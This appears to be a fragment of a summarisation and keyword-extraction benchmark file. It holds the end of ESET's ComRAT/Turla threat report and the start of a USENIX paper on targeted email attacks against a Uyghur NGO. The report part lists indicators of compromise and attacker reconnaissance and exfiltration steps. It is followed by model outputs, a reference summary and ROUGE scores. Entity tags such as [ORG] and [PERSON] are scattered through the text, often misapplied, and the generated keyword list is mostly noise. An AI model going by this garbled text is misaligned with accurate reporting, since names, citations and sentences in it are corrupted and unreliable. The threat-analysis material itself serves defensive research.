GMX or [ORG] VFEmail . It is also the email address from which the operators send commands to the [PERSON] Gmail address . Figure [CARDINAL] 25 is an example of an email created by ComRAT.Figure [CARDINAL] 25 // Email sent by ComRAT to the operators \u2019 email address ( partially redacted and openedin [ORG] Microsoft [ORG] Outlook for demonstration purposes [ORG] only)4.6 [ORG] Backdoor commands The operators can send commands using either of the [ORG] C&C channels . The backdoor will receive the command ID and the arguments , if any . As seen in [LAW] Table [LAW] 1 , the commands implemented in ComRAT v4 are not surprising and allow control of almost everything on the machine : manage files , execute additional processes or gather logs . Table 1List of backdoor commands in ComRAT v4ID Write in a file Read a file Execute a command with cmd.exe [PERSON] Set the timeout for the [ORG] C&C channel Add an address in /etc / transport / legacy / [PERSON] get.list or in /etc / transport / legacy / post.list [PERSON] Send /var / log / working.c4log [WORK_OF_ART] Load [WORK_OF_ART] a [WORK_OF_ART] PE from memory using an internal [ORG] PE loader [WORK_OF_ART] Load [WORK_OF_ART] a [WORK_OF_ART] PE from file using an internal [ORG] PE loader [PERSON] Delete an address from /etc / transport / legacy / [PERSON] get.list or /etc / transport / legacy / post.list Get the configuration [PERSON] List a directory in [ORG] the [ORG] Virtual [ORG] File [ORG] System [ORG] Execute a PE with CreateProcessW [ORG] Invoke a [ORG] PowerShell script from memory using a [ORG] PowerShell runner [ORG] Invoke a [ORG] PowerShell script from a file using a [ORG] PowerShell runner [ORG] Delete the messages in the [PERSON] Gmail mailbox ( added in the most recent version , [ORDINAL] first seen around [DATE] November [DATE] 2019)205 . [ORG] CONCLUSION [ORG] Version [CARDINAL] four of ComRAT is a totally revamped malware family released in [DATE] 2017 . Its developers took inspiration from other [GPE] Turla backdoors , such as Snake , to build a very complex piece of malware . Its most interesting features are [ORG] the [ORG] Virtual [ORG] File [ORG] System in FAT16 format and the ability to use the [PERSON] Gmail web UI to receive commands and exfiltrate data . Thus , it is able to bypass some security controls because it does n\u2019t rely on any malicious domain . We also noticed that this new version abandoned the use of [ORG] COM object hijacking for persistence , the method that gave the malware its common name . We found indications that ComRAT v4 was still in use at [DATE] the [DATE] beginning [DATE] of [DATE] 2020 , showing that the [GPE] Turla group is still very active and a major threat for diplomats and militaries . We will continue to monitor [GPE] Turla developments to help defenders protect their networks . Indicators of Compromise can also be found on [ORG] GitHub . For any inquiries , or to make sample submissions related to the subject , contact us at : threatintel@eset com.216 . BIBLIOGRAPHY [CARDINAL] 1 Yle . ( [DATE] 2016 , [DATE] 01 [DATE] 13 ) . [NORP] Russian group behind 2013 [ORG] Foreign [ORG] Ministry hack . Retrieved fromurl fi / uutiset / osasto / news / russian_group_behind_2013_foreign_ministry_hack/85915482 [PERSON] Boutin , J.-I. ( [DATE] 2017 , [DATE] 06 [DATE] 06 ) . [PERSON] Turla \u2019s watering hole campaign : An updated Firefoxextension abusing Instagram . Retrieved from url welivesecurity com/2017/06/06/ turlas - watering - hole - campaign - updated - firefox - extension - abusing - instagram/3 Cherepanov , [WORK_OF_ART] A. ( [DATE] 2017 , [DATE] 06 [DATE] 30 ) . TeleBots are back : Supply - chain attacks against [GPE] Ukraine . ( ESET ) Retrieved fromurl welivesecurity com/2017/06/30 / telebots - back - supply - chain - attacks - against - ukraine/4 Cherepanov , [ORG] A. ( [DATE] 2018 , [CARDINAL] 10 ) . GREYENERGY : A successor to [ORG] BlackEnergy . ( ESET ) Retrieved fromurl welivesecurity com / wp - content / uploads/2018/10 / ESET_GreyEnergy pdf5 Corfield , [ORG] G. ( [ORG] 2020 , [ORG] 02 [ORG] 14 ) . [NORP] Austrian foreign ministry : \u2018 State actor \u2019 hack on government IT systems is over . Retrieved from url theregister co uk/2020/02/14 / austria_foreign_ministry_hack_turla_group_allegs/6 ESET . ( [DATE] 2018 , [DATE] 08 ) . [PERSON] Turla [PERSON] Outlook [PERSON] Backdoor . Retrieved fromurl welivesecurity com / wp - content / uploads/2018/08 / Eset - Turla - Outlook - Backdoor pdf7 ESET Research . ( [DATE] 2017 , [CARDINAL] 03 [CARDINAL] 30 ) . Carbon Paper : Peering into [ORG] Turla \u2019s [ORDINAL] second stage backdoor . ( ESET ) Retrieved fromurl welivesecurity com/2017/03/30 / carbon - paper - peering - turlas - second - stage - backdoor/8 ESET Research . ( [DATE] 2017 , [DATE] 08 ) . Gazing at [ORG] Gazer [ORG] - [ORG] Turla \u2019s new [ORDINAL] second stage backdoor . ( ESET ) Retrieved fromurl welivesecurity com / wp - content / uploads/2017/08 / eset - gazer pdf9 [ORG] ESET [ORG] Research . ( [DATE] 2018 , [DATE] 01 ) . Diplomats in [LOC] Eastern [LOC] Europe bitten by a [GPE] Turla mosquito . ( ESET ) Retrieved fromurl welivesecurity com / wp - content / uploads/2018/01 / ESET_Turla_Mosquito pdf10 ESET Research . ( [DATE] 2018 , [DATE] 05 [DATE] 22 ) . [PERSON] Turla [PERSON] Mosquito : A shift towards more generic tools . Retrieved fromurl welivesecurity com/2018/05/22 / turla - mosquito - shift - towards - generic - tools/11 [PERSON] Faou , M. ( [DATE] 2019 , [DATE] 05 ) . [PERSON] Turla [PERSON] LightNeuron . Retrieved fromurl welivesecurity com / wp - content / uploads/2019/05 / ESET - LightNeuron pdf12 [PERSON] Faou , M. ( [DATE] 2020 , [CARDINAL] 03 [CARDINAL] 12 ) . Tracking [PERSON] Turla : New backdoor delivered via [NORP] Armenian watering holes . Retrieved fromurl welivesecurity com/2020/03/12 / tracking - turla - new - backdoor - armenian - watering - holes/13 [PERSON] Faou , M. , & Dumont , [NORP] R. ( [DATE] 2019 , [DATE] 05 [DATE] 29 ) . A dive into [PERSON] Turla [PERSON] PowerShell usage . Retrieved fromurl welivesecurity com/2019/05/29 / turla - powershell - usage/14 G DATA . ( [DATE] 2014 , [DATE] 03 [DATE] 07 ) . Uroburos \u2013 Deeper travel into kernel protection mitigation . Retrieved fromurl gdatasoftware com / blog/2014/03/23966 - uroburos - deeper - travel - into - kernel - protection - mitigation15 G DATA . ( [DATE] 2015 , [DATE] 01 [DATE] 15 ) . Evolution of sophisticated spyware : from Agent . BTZ to ComRAT . Retrieved fromurl gdatasoftware com / blog/2015/01/23927 - evolution - of - sophisticated - spyware - from - agent - btz - to - [PERSON] comrat16 [PERSON] Huss , [NORP] D. ( [DATE] 2017 , [DATE] 08 [DATE] 17 ) . [PERSON] Turla [PERSON] APT actor refreshes [ORG] KopiLuwak [ORG] JavaScript backdoor for use in [ORG] G20 - themed attack . Retrieved from url proofpoint com / us / threat - insight / post/ turla - apt - actor - refreshes - kopiluwak - javascript - backdoor - use - g20 - themed - [PERSON] attack17 [PERSON] Kaspersky [PERSON] GReAT . ( [DATE] 2018 , [DATE] 10 [DATE] 04 ) . [PERSON] Shedding [PERSON] Skin [PERSON] - [PERSON] Turla \u2019s [PERSON] Fresh [PERSON] Faces . Retrieved fromurl com / shedding - skin - turlas - fresh - faces/88069/18 [ORG] KNOWLTON , [ORG] B. ( [DATE] 2010 , [DATE] 08 [DATE] 25 ) . Military Computer [PERSON] Attack [PERSON] Confirmed . ( [ORG] New [ORG] York [ORG] Times ) Retrieved [DATE] 04 [DATE] 09 , [CARDINAL] 2018,from url nytimes com/2010/08/26 / technology/26cyber html19 [ORG] Managed [ORG] Adversary [ORG] and [ORG] Threat [ORG] Intelligence ( MATI ) . ( [DATE] 2019 , [DATE] 06 [DATE] 20 ) . Waterbug : Espionage Group Rolls Out Brand - New Toolset in Attacks Against Governments . Retrieved from url broadcom com / blogs / threat - intelligence / waterbug - espionage - governments20 MELANI . ( [DATE] 2016 , [CARDINAL] 05 [CARDINAL] 23 ) . Technical Report about the [ORG] Malware used in the Cyberespionage against RUAG.Retrieved from url melani admin ch / melani / en / home / dokumentation / reports / technical - reports/ technical - report_apt_case_ruag html2221 National Cyber Security Centre . ( [DATE] 2017 , [DATE] 11 [DATE] 23 ) . [PERSON] Turla group using [ORG] Neuron and [PRODUCT] Nautilus tools alongsideSnake malware . Retrieved from url ncsc gov uk / static - assets / documents / Turla%20group%20using % 20Neuron%20and%20Nautilus%20tools%20alongside%20Snake%20malware_1 pdf2223Schlee , M. ( [DATE] 2018 , [DATE] 03 [DATE] 06 ) . Hackers used Outlook for cyberattack on [NORP] German government : report . Retrieved from url politico eu / article / report - hackers - used - outlook - for - cyberattack - on - german - government / Shevchenko , [WORK_OF_ART] S. ( [WORK_OF_ART] 2008 , [WORK_OF_ART] 11 ) . Agent.btz - A Threat That Hit [FAC] Pentagon . Retrieved from url threatexpert [ORG] com/2008/11 / agentbtz - threat - that - hit - pentagon [PERSON] html24 [PERSON] Tanase , S. ( [DATE] 2015 , [DATE] 09 [DATE] 09 ) . [PERSON] Satellite [PERSON] Turla : [ORG] APT [ORG] Command and Control in the [WORK_OF_ART] Sky . Retrieved fromurl com / satellite - turla - apt - command - and - control - in - the - sky/72081/25 Untersinger , M. ( [DATE] 2019 , [DATE] 01 [DATE] 29 ) . Quelle est la bonne \u00e9quation pour pacifier le cyberespace ? ( Le Monde2019)Retrieved from url lemonde fr / pixels / article/2019/01/29 / course - aux - cyberarmes - logiciels - destructeurs - dormants - le - difficile- apaisement - du - cyberespace_5416003_4408996 html26 Wikipedia . ( n.d . ) . Abstract factory pattern . Retrieved [DATE] 03 [DATE] 17 , [DATE] 2020 , fromurl wikipedia org / wiki / Abstract_factory_pattern27 [ORG] Wikipedia . ( n.d . ) . Adapter pattern . Retrieved [DATE] 03 [DATE] 17 , [DATE] 2020 , fromurl wikipedia org / wiki / Adapter_pattern28 [ORG] Wikipedia . ( n.d . ) . Mediator pattern . Retrieved [DATE] 03 [DATE] 17 , [DATE] 2020 , fromurl wikipedia org / wiki / Mediator_pattern237.INDICATORS OF COMPROMISE7.1 HashesSHA-1 ComRAT orchestratorESET detection name [ORG] PowerShell / [PERSON] Turla . X Win64 / [PERSON] Turla . BY Win64 / [PERSON] Turla . [ORG] AP Win32 / [PERSON] Turla . EI7.2 [PERCENT] Paths%TEMP%\\FXSAPIDebugTrace.txt [PERCENT] % TEMP%\\iecache.bin7.3 Windows registry(HKLM|HKCU)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\ { 59031A47 - 3F72 - 44A7 - 80C5 - 5595FE6B30EE } HKLM\\SOFTWARE\\Microsoft\\SQMClient\\Windows . [ORG] WSqmCons7.4 [ORG] Network foods.jkub[.]com progress.zyns[.]com scrabble.ikwb[.]com wekanda[.]tk248 . MITRE ATT&CK TECHNIQUES T1086PersistenceT1053Scheduled TaskT1027Obfuscated [PERSON] Files or InformationT1055Process InjectionT1112Modify [WORK_OF_ART] RegistryDescription [WORK_OF_ART] A [WORK_OF_ART] PowerShell script is used to install ComRAT . ComRAT uses a scheduled task to launch its [ORG] PowerShell loader . The ComRAT orchestrator is stored encrypted and only decrypted at execution . The ComRAT orchestrator is injected into explorer.exe . The communication [ORG] DLL is injected into the default browser . The ComRAT orchestrator is stored encrypted in the registry . Defense EvasionDiscoveryCollectionCommand and ControlExfiltrationT1016T1033T1069T1082Operators execute ipconfig and nbstat . [ORG] System [ORG] Network [ORG] Configuration Discovery System Owner / User Discovery Permission Groups Discovery Operators execute net group /domain . System Information DiscoveryOperators execute systeminfo . Operators execute net user . T1083File and Directory DiscoveryT1087T1120T1135T1213T1024T1043T1071T1102 T1002 T1022T1048Account DiscoveryPeripheral Device DiscoveryNetwork Share Discovery Data from Information Commonly Used Port Alternative ProtocolOperators list the content of several directories . Example : dir /og - d \u201c % userprofile%\\AppData\\ Roaming\\Microsoft\\Windows\\Recent\\ * . * \u201d . Operators execute net user and net group . Operators execute fsutil fsinfo drives to list the connected drives . Operators execute net view . The Operators use a custom tool to exfiltrate documents from an internal central database . ComRAT uses [ORG] RSA and [ORG] AES to encrypt [ORG] C&C data . ComRAT uses ports [CARDINAL] 80 and 443.ComRAT uses HTTP and HTTPS.ComRAT can be controlled via the [PERSON] Gmail web UI . The documents are compressed in a [ORG] RAR archive . The [ORG] RAR archive is encrypted with a password . Data is exfiltrated to cloud storage , mounted locally using the net use command .", "generated_text": "PDF; ESET Research; Turla; Snake; at least 2007; use; at least 2007; 2017; at least 2020; Armenia; the Middle East; the malware; the orchestrator; orchestrator modules; DLL; data; devices; the orchestrator; functions; command execution; the orchestrator; a command execution mechanism; the orchestrator; the tools; Analysis; the Operation; rules; a rootkit; Microsoft Exchange mail servers; pivoting; the ComRAT backdoor; the operating system; C++; the attackers; the infrastructure; infrastructure; key; the path; the C&C mode; commands; EXEC; the orchestrator; time; the process; C&C mode; command; tools; formats; the malware; v4; the key; v4 orchestrator; the orchestrator; the ESET team; time.", "ref_text": "<START-1>The report by ESET analyzes the evolution of a sophisticated malware family called ComRAT, used by the cyberespionage group Turla (also known as Snake). Turla has been active for over 10 years targeting high-profile organizations like governments and militaries in Europe, Central Asia, and the Middle East. ComRAT originated as the malware Agent.BTZ which was involved in a 2008 breach of the US military. It has gone through several iterations over the years, with version 4 released around 2017 being a complete code rewrite. ComRAT v4 uses complex features like a virtual FAT16 file system to store its configuration and modules. It has two command and control channels - one using HTTP like older versions, and one newly added that utilizes the Gmail web interface to send commands and exfiltrate data. ESET has identified at least 3 targets of ComRAT v4 - two foreign ministries and one national parliament. It is used to gather sensitive documents which are compressed and exfiltrated via public cloud storage services. ComRAT v4 is attributed to Turla based on victimology, shared code, and infrastructure links to other Turla tools. It is still in use as of early 2020, showing the group's continued development. The report concludes that Turla remains a highly capable threat actor through long-term use and constant evolution of advanced malware like ComRAT. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5323383084577114, "gpt3/lexical/rouge_rouge2": 0.205, "gpt3/lexical/rouge_rougeL": 0.29850746268656714, "gpt3/lexical/rouge_rougeLsum": 0.29850746268656714, "gpt3_generated_text": ["This article by ESET Research provides an analysis of the Turla cyberespionage group and their use of the ComRAT backdoor malware. Turla, also known as Snake, has been active for over a decade and primarily targets high-profile entities such as governments and diplomatic organizations in Europe, Central Asia, and the Middle East. The group has been responsible for breaching major organizations including the US Department of Defense and the Swiss defense company RUAG. The latest version of their backdoor, ComRAT v4, was first seen in 2017 and is still in use as of January 2020. The article highlights that ComRAT was used to exfiltrate sensitive documents, with the operators utilizing public cloud services such as OneDrive and 4shared. ComRAT is a complex backdoor developed in C++ and uses a Virtual File System formatted in FAT16. It is deployed using existing access methods, including the PowerStallion PowerShell backdoor. The malware has two Command and Control channels: HTTP and Email. The article provides an overview of the Turla profile, their high-profile attacks, and the technical analysis of the ComRAT backdoor."]}, {"split_name": "val", "sample_id": "val_86", "prompt_text": "Extract the keywords: A Look at Targeted Attacks Through the Lenseof an NGOStevens Le Blond , [PERSON] Adina [PERSON] Uritesc , and [PERSON] C\u00e9dric [PERSON] Gilbert , [ORG] Max [ORG] Planck [ORG] Institute [ORG] for [ORG] SoftwareSystems ( MPI - SWS ) ; [PERSON] Zheng [PERSON] Leong [PERSON] Chua and [PERSON] Prateek [PERSON] Saxena , [ORG] National [ORG] University [ORG] ofSingapore ; [PERSON] Engin [PERSON] Kirda , Northeastern Universityurl Look at Targeted Attacks Through the Lense of an [PRODUCT] NGOStevens [FAC] Le [FAC] Blond1 [PERSON] Zheng [PERSON] Leong Chua2Adina [PERSON] Uritesc1 [PERSON] Prateek Saxena2C\u00b4edric Gilbert1 Engin Kirda31MPI [ORG] - SWS2National [ORG] Univ . of Singapore3Northeastern Univ . [ORG] AbstractWe present an empirical analysis of targeted attacks against a human - rights Non [ORG] - Governmental [ORG] Organization ( NGO ) representing a minority living in [GPE] China . In par- ticular , we analyze the social engineering techniques , at- tack vectors , and malware employed in malicious emails received by [CARDINAL] two members of the [ORG] NGO over a [DATE] four [DATE] - [DATE] year period . We \ufb01nd that both the language and topic of the emails were highly tailored to the victims , and that sender impersonation was commonly used to lure them into opening malicious attachments . We also show that the majority of attacks employed malicious documents with recent but disclosed vulnerabilities that tend to evade common defenses . Finally , we \ufb01nd that the NGO received malware from different families and that over a quarter of the malware can be linked to entities that have been reported to engage in targeted attacks against polit- ical and industrial organizations , and [NORP] Tibetan NGOs . 1 Introduction In [DATE] the [DATE] last [DATE] few [DATE] years , a new class of cyber attacks has emerged that is more targeted at individuals and organi- zations . Unlike their opportunistic , large - scale counter- parts , targeted attacks aim to compromise a handful of speci\ufb01c , high - value victims . These attacks have received substantial media attention , and have successfully com- promised a wide range of targets including critical na- tional infrastructures [ [CARDINAL] 19 ] , Fortune 500 companies [ [CARDINAL] 23 ] , news agencies [ [CARDINAL] 20 ] , and political dissidents [ [DATE] 10 , [DATE] 11 , [CARDINAL] 16 ] . Despite the high stakes involved in these attacks , the ecosystem sustaining them remains poorly understood . The main reason for this lack of understanding is that vic- tims rarely share the details of a high - pro\ufb01le compromise with the public , and they typically do not disclose what sensitive information has been lost to the attackers . Ac- cording to folk wisdom , attackers carrying out targeted attacks are generally thought to be state - sponsored . Ex- amples of national organizations that have been reported to be engaged in targeted attacks include [ORG] the NSA \u2019s of-\ufb01ce of [ORG] Tailored [ORG] Access [ORG] Operations ( [ORG] TAO ) [ [CARDINAL] 3 ] and [ORG] the People \u2019s [ORG] Liberation Army \u2019s Unit 61398 [ [CARDINAL] 15 ] . Recently , researchers also attributed attacks in [LOC] the [LOC] Middle [LOC] East to the governments of [GPE] Bahrain , [GPE] Syria , and [GPE] the [GPE] United [GPE] Arab [GPE] Emirates [ 16].There now exists public evidence that virtually every computer system connected to the internet is susceptible to targeted attacks . The Stuxnet attack even successfully compromised air - gapped [NORP] Iranian power plants [ [CARDINAL] 19 ] and was able to damage the centrifuges in the facility . More recently , Google , Facebook , [ORG] the [ORG] New [ORG] York [ORG] Times , and many other global companies have been compromised by targeted attacks . Furthermore , political dissidents and Non [ORG] - Governmental [ORG] Organizations ( NGOs ) are also being targeted [ [DATE] 10 , [DATE] 11 , 16].In this paper , we analyze [CARDINAL] 1,493 suspicious emails col- lected over a [DATE] four [DATE] - [DATE] year period by [CARDINAL] two members of [ORG] the [ORG] World [ORG] Uyghur [ORG] Congress ( [ORG] WUC ) , an NGO representing an ethnic group of over [CARDINAL] ten [CARDINAL] million individuals mainly living in [GPE] China . [ORG] WUC volunteers who suspected that they were being speci\ufb01cally targeted by malware shared the suspicious emails that they received with us for anal- ysis . We \ufb01nd that these emails contain [CARDINAL] 1,176 malicious attachments and target 724 unique email addresses be- longing to individuals af\ufb01liated with [CARDINAL] 108 different orga- nizations . This result indicates that , despite their targeted content , these attacks were sent to several related victims ( e.g. , via Cc ) . Although the majority of these targeted or- ganizations were NGOs , they also comprised a few high- pro\ufb01le targets such as [ORG] the [ORG] New [ORG] York [ORG] Times and [GPE] US em- bassies . We leverage this dataset to perform an empirical anal- ysis of targeted attacks in the wild . [ORDINAL] First , we analyze the engineering techniques and \ufb01nd that the language and topic of the malicious emails were tailored to the mother tongue and level of specialization of the victims . We also \ufb01nd that sender impersonation was common and that some attacks in our dataset originated from com- promised email accounts belonging to high - pro\ufb01le ac - USENIX Association23rd [ORG] USENIX Security Symposium 5431tivists . [ORDINAL] Second , whereas recent studies report that ma- licious archives and executables represented the majority of the targeted - attack threat [ [CARDINAL] 15 , [CARDINAL] 22 ] , we \ufb01nd that mali- cious documents were the most common attack vector in our dataset . Although we do not \ufb01nd evidence of [DATE] zero- [DATE] day vulnerabilities , we observe that most attacks used re- cent vulnerabilities , that exploits were quickly replaced to adapt to new defense mechanisms , and that they of- [CARDINAL] ten bypassed common defenses . [ORDINAL] Third , we perform an analysis of the \ufb01rst - stage malware delivered over these malicious emails and \ufb01nd that [ORG] WUC has been targeted with different families of malware over [DATE] the [DATE] last [DATE] year . We \ufb01nd that over a quarter of these malware samples exhib- ited similarities with those used by entities reported to have carried out targeted attacks . Our work complements existing reports on targeted at- tacks such as [ORG] GhostNet , [ORG] Mandiant , and [NORP] Symantec Inter- net [ORG] Security [ORG] Threat ( [ORG] ISTR ) [DATE] 2013 [ [CARDINAL] 11 , [DATE] 15 , [CARDINAL] 22 ] . Whereas the [ORG] GhostNet and [ORG] Mandiant reports focus on the attack lifecycle after the initial compromise , this study provides an in - depth analysis of the reconnaissance performed be- fore the compromise . We note that both approaches have pros and cons and are complementary : While it is hard for the authors of these reports to know how a system be- came compromised in retrospect , it is equally hard for us to know if the observed attacks will compromise the tar- geted system(s ) . Finally , whereas [ORG] ISTR provides some numbers about reconnaissance analysis for industrial- espionage attacks [ [CARDINAL] 22 ] , we present a thorough and rig- orous analysis of the attacks in our dataset . Finally , to foster research in this area , we release ourdataset of targeted malware to the community [ [CARDINAL] 4 ] . Scope . Measuring real - world targeted attacks is chal- lenging and this paper has a number of important bi- ases . [ORDINAL] First , our dataset contains mainly attacks against the [LOC] Uyghur and human - rights communities . While the speci\ufb01cs of the social engineering techniques ( e.g. , use of [LOC] Uyghur language ) will vary from [CARDINAL] one targeted com- munity to another , we argue that identifying commonly used techniques ( e.g. , topic , language , senders \u2019 imper- sonation ) and their purpose is a necessary step towards designing effective defenses . Another limitation of our dataset is that it captures only targeted attacks carried out over email channels and that were detected by our vol- unteers . Although malicious emails seem to constitute the majority of targeted attacks , different attack vectors such as targeted drive - by downloads are equally impor- tant . Finally , we reiterate that the goal of this study is to understand the reconnaissance phase occurring before a compromise . Analyzing [ORDINAL] second - stage malware , monitor- ing compromised systems , and determining the purpose of targeted attacks are all outside of the scope of this pa- per and are the topic of recent related work [ [CARDINAL] 10 , [CARDINAL] 16 ] . We discuss open research challenges in Section 6.Figure [CARDINAL] 1 : Screenshot of a malicious email with an im- personated sender , and a malicious document exploit- ing [ORG] Common [ORG] Vulnerabilities and Exposures ( [ORG] CVE ) num- ber 2012 - 0158 and containing malware . The email re- plays an actual announcement about a conference in [GPE] Geneva and was edited by the attacker to add that all fees would be covered.2 [ORG] OverviewContext . [ORG] WUC , the NGO from which we have received our dataset , represents the [ORG] Uyghurs , an ethnic minority concentrated in the [GPE] Xinjiang region in [GPE] China . [GPE] Xinjiang is the largest [NORP] Chinese administrative division , has abun- dant natural resources such as oil , and is [GPE] China \u2019s largest natural gas - producing region . [ORG] WUC frequently engages in advocacy and meeting with politicians and diplomats at the [ORG] EU and [ORG] UN , as well as collaborating with a variety of NGOs . Rebiya Kadeer , [ORG] WUC \u2019s current president , was the \ufb01fth richest person in [GPE] China before her imprisonment for dissent in [DATE] 1996 , and is now in exile in the [GPE] US . Fi- nally , [ORG] WUC is partly funded by [ORG] the [ORG] National [ORG] Endowment [ORG] for [ORG] Democracy ( [ORG] NED ) , a [GPE] US NGO itself funded by [ORG] the [ORG] US [ORG] Congress to promote democracy . ( We will see below that [ORG] NED has been targeted with the same malware as WUC.)WUC has been a regular target of Distributed De- nial of [ORG] Service [ORG] ( [ORG] DDoS ) attacks and telephone disrup- tions , as well as targeted attacks . For example , [ORG] the [ORG] WUC \u2019s website became inaccessible from [DATE] June [DATE] 28 [DATE] to [DATE] July [DATE] 10 , [DATE] 2011 due to such a [ORG] DDoS attack . Concurrently to this attack , the professional and private phone lines of [ORG] WUC employees were \ufb02ooded with incoming calls , and the [ORG] WUC \u2019s contact email address received [CARDINAL] 15,000 spam emails in [DATE] one [DATE] week . Data acquisition . In addition to these intermittent threats , [ORG] WUC employees constantly receive suspicious emails impersonating their colleagues and containing544 23rd [ORG] USENIX [ORG] Security [NORP] SymposiumUSENIX Association2malicious links and attachments . These emails consis- tently evade spam and malware defenses deployed by webmail providers and are often relevant to [ORG] WUC \u2019s ac- tivities . In fact , our volunteers claim that the emails are often so targeted that they need to con\ufb01rm their legiti- macy with the impersonated sender in person . For ex- ample , Figure [CARDINAL] 1 shows the screenshot of such an email that replays the actual announcement for a conference in [GPE] Geneva organized by [ORG] WUC . As a result , [ORG] WUC members are wary of any emails containing links or attachments , and some of them save these emails for future inspec- tion . We came in contact with [CARDINAL] two [ORG] WUC employees who shared the suspicious emails that they had received ( with consent from [ORG] WUC ) . The authors of this work were not involved in the data collection . Characteristics of the dataset . The [CARDINAL] two volunteers shared with us the headers and content of [CARDINAL] 1,493 suspi- cious emails that they received over a [DATE] four [DATE] - [DATE] year period . [CARDINAL] 1,178 ( 79 % ) of these emails were sent to the private email addresses of the [CARDINAL] two NGO employees from whom we obtained the data , [CARDINAL] 16 via the public email address of the [ORG] WUC , and the remaining [CARDINAL] 299 emails were forwarded to them ( [CARDINAL] 126 of these by colleagues at [ORG] WUC ) . Overall , 89 % of these emails were received directly by our volun- teers or their colleagues at [ORG] WUC . As we will see below , they also contain numerous email addresses in the To and [PERSON] Cc \ufb01elds belonging to individuals that are not af\ufb01liated with WUC.The emails contained [CARDINAL] 209 links and [CARDINAL] 1,649 attachments , including [CARDINAL] 1,176 with malware ( [CARDINAL] 247 RAR , [CARDINAL] 49 [CARDINAL] ZIP , [CARDINAL] 144 [ORG] PDF , and [CARDINAL] 655 [ORG] Microsoft [ORG] Of\ufb01ce \ufb01les , and [CARDINAL] 81 \ufb01les in other formats ) . Our analysis revealed [CARDINAL] 1,116 malicious emails containing malware attachments . ( We were not able to verify the maliciousness of the links as most of them were invalid by the time we obtained the data . ) In the fol- lowing , we analyze malicious emails exclusively and we refer to malicious archives or documents depending on whether they contained [ORG] RAR or ZIP , [ORG] PDF or [ORG] Microsoft [ORG] Of\ufb01ce documents , respectively . Finally , the volunteers labeled the data wherever necessary , enabling us , for ex- ample , to establish that the sender of the emails was im- personated for 84 % of the emails . Table 1 summarizes the main characteristics of these malicious emails . Scope of the dataset . Analyzing the headers of the ma- licious emails revealed a surprisingly large number of re- cipients in the To or [PERSON] Cc \ufb01elds . In particular , we observed that malicious emails had been sent to [CARDINAL] 1,250 unique email addresses and [CARDINAL] 157 organizations . A potential ex- planation for this behavior could be that the attacker tam- pered with the email headers ( e.g. , via a compromised SMTP server ) as part of social engineering so these emails were only delivered to our volunteers , despite the additional indicated recipients . To test this hypoth- esis , we considered only those emails received directlyby our volunteers , originating from well - known webmail domains ( i.e. , aol.com , [GPE] gmx.de , gmx.com , gmail.com , googlemail.com , hotmail.com , outlook.com , and ya- hoo.com ) , and veri\ufb01ed via Sender Policy Framework ( SPF ) and [ORG] DomainKeys [ORG] Identi\ufb01ed [ORG] Mail ( DKIM ) . SPF and [ORG] DKIM are methods commonly used to authenticate the sending server of an email message . By verifying that these malicious emails originated from well - known webmail servers , we obtain [CARDINAL] 568 malicious emails whose headers are very unlikely to have been tampered with by the attacker . By repeating our above analysis on these emails only , we obtain 724 unique email addresses and [CARDINAL] 108 organizations . Other organizations besides [ORG] WUC include [ORG] NED ( [ORG] WUC \u2019s main source of funding and it- self funded by the [GPE] US congress ) , [ORG] the [ORG] New [ORG] York [ORG] Times , and [GPE] US embassies . In summary , while we obtained our dataset from [CARDINAL] two volunteers working for a single orga- nization , it offers substantial coverage not only of [CARDINAL] one NGO , but also of those attacks against multiple NGOs in which attackers target [CARDINAL] more [CARDINAL] than [CARDINAL] one organization with the same email . We show the full list of organizations targeted in our dataset in [NORP] Appendix A.What are targeted attacks ? There is no precise de\ufb01ni- tion of targeted attacks . In this paper , we loosely de\ufb01ne these attacks as low - volume , socially engineered com- munication which entices speci\ufb01c victims into installing malware . In the dataset we analyze here , the communi- cation is by email , and the mechanism of exploitation is primarily using malicious archives or documents . A tar- geted victim , in this work , refers to speci\ufb01c individuals , or an organization as a whole . When necessary , we also use the term volunteer(s ) to distinguish between our [CARDINAL] two collaborators and other victims . The terms targeted attacks and [ORG] Advanced [ORG] Persistent [ORG] Threats ( or APTs ) are often used interchangeably . As this paper focuses on the reconnaissance phase of tar- geted attacks ( occurring before a compromise ) , we can- not measure how long attackers would have remained in control of the targeted systems ( i.e. , their persistency ) . As a result , we simply refer to these attacks as targeted attacks , and not APTs , throughout the rest of this pa- per . We discuss speci\ufb01c social engineering characteris- tics that make targeted attacks dif\ufb01cult to detect by un- suspecting average users in [LAW] Section [LAW] 3 , the attack vectors used in our dataset in [LAW] Section [LAW] 4 , and the malware fam- ilies they install in [LAW] Section [LAW] 5 . Finally , we will discuss open research challenges in [LAW] Section [LAW] 6.Ethics . The dataset was collected prior to our contact- ing [ORG] WUC and for the purpose of future security analysis . Furthermore , [ORG] WUC approved the disclosure of all the in- formation contained in this paper and requested that the organization \u2019s name not be anonymized . [ORG] USENIX Association23rd [ORG] USENIX Security Symposium 5453Table 1 : Summary of our dataset originating from [CARDINAL] two volunteers . Malicious indicates the fraction of emails containing malware , Impersonated the fraction of emails with an impersonated sender , [CARDINAL] # recipients and [ORG] # orgs the number of unique email addresses that were listed in the To and [PERSON] Cc \ufb01elds of the malicious emails and the corresponding number of organizations , respectively.1st volunteer 2nd volunteerTotalBeginning - endSept [DATE] 2012 [DATE] - [DATE] Sept [DATE] 2013 Sept 2009 - Jul 2013 Sept 2009 - Sept 2013Size 916 MBMalicious154/241 ( 64 % ) [CARDINAL] 962/1,252 ( 77 % ) 1,116/1,493 ( 75%)Impersonated141/154 ( [PERCENT] 92 % ) [CARDINAL] 802/962 ( 83 % ) 943/1,116 ( 84 % ) [CARDINAL] # recipients # orgs124 1083 Analysis of social engineeringThe [ORG] GhostNet , [ORG] Mandiant , [ORG] ISTR , and other reports [ [CARDINAL] 11 , [DATE] 15 , [CARDINAL] 22 ] mention the use of socially - engineered emails to lure their victims into installing malware , clicking on malicious links , or opening malicious documents . For example , the [ORG] GhostNet report refers to [CARDINAL] one spoofed email containing a malicious [ORG] DOC attachment , and the Man- diant report to [CARDINAL] one email sent from a webmail account bearing the name of the company \u2019s CEO enticing several employees to open malware contained in a ZIP archive . Concurrent work reports the use of careful social engi- neering against civilians and NGOs in [LOC] the [LOC] Middle [LOC] East [ [CARDINAL] 16 ] and also [NORP] Tibetan and human - rights NGOs [ [CARDINAL] 10 ] . De- spite this anecdotal evidence , we are not aware of any rigorous and thorough analysis of the social engineering techniques employed in targeted attacks . In this section , we seek to answer the following 